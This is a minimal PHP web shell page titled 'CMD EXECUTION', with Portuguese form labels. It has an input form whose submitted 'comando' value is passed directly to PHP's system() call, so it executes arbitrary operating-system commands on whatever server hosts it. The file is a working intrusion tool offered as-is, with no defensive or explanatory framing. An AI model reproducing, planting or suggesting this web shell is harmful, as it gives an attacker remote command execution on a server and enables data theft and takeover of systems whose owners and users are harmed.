<html
<head>
	<meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CMD EXECUTION</title>
  
</head>
	

<body>
	<img src="BoringGraveAmericanbobtail-small.gif">
	<marquee behavior="slide"><lnk>https://github.com/LeanerDev</lnk></marquee>
<form  action="Webshell.php" method="POST">
comando: <br>
<input type=text name="comando">
<input type=submit  name="executa" value="executa">
<h1>Comandos executados abaixo.</h1>





</body>


<?php
  system($_POST['comando']);
?>

